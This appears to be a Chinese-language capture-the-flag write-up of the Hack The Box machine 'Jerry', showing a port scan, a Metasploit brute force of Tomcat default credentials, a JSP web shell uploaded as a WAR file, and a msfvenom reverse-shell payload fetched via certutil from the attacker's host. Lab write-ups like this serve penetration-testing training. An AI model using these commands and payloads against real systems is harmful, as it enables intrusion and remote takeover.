---
title: Jerry (Hack The Box Writeup)
date: 2021-09-15T13:58:00+08:00
draft: false
url: "/2021/09/15/jerry-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/144
- IP :10.129.1.110

## Scan

- 掃 Portrustscan -a 10.129.1.110 -r 1-65535
- ![](/uploads/2022/02/df0cc-Eo7xo0g.png)
- 發現有開8080

## Brute Force

- 嘗試 msf 爆破`auxiliary/scanner/http/tomcat_mgr_login`
- 發現密碼是 `tomcat:s3cret`
- ![](/uploads/2022/02/b7cd6-cxpZApC.png)Wordlist- /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
- /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt

## 進入 Manager APP

- 發現不登入直接按 Manager App 就可以進後台ㄌ= =![](/uploads/2022/02/31adc-NsGdRoj.png)
- ![](/uploads/2022/02/2cc2d-LQwHTzl.png)
- ![](/uploads/2022/02/277ad-F8NaHMz.png)

## Web shell

- 準備 jsp web shellhttps://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp![](/uploads/2022/02/4cde3-nOjaVlZ.png)`jar -cvf cmd.war cmd.jsp`- ![](/uploads/2022/02/7ed52-777lPwk.png)上傳 webshell- ![](/uploads/2022/02/76c14-6fmGHir.png)執行 webshell- ![](/uploads/2022/02/61a05-olnHhyd.png)
- 發現本來就是 system 權限確認系統資料- ![](/uploads/2022/02/ea2ee-Ue6dTUE.png)
- 64 bit

## Reverse shell

- 準備 Reverse shell`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7877 -f exe > shell.exe`下載 reverse shell- `certutil -urlcache -f http://10.10.16.35/shell.exe shell8787.exe`
- ![](/uploads/2022/02/91369-OI4Au01.png)執行 Reverse shell- ![](/uploads/2022/02/250b1-RXZuM8K.png)取得 Flag- ![](/uploads/2022/02/8cc0b-lficF3v.png)
- ![](/uploads/2022/02/b9ea2-pSWHq2O.png)
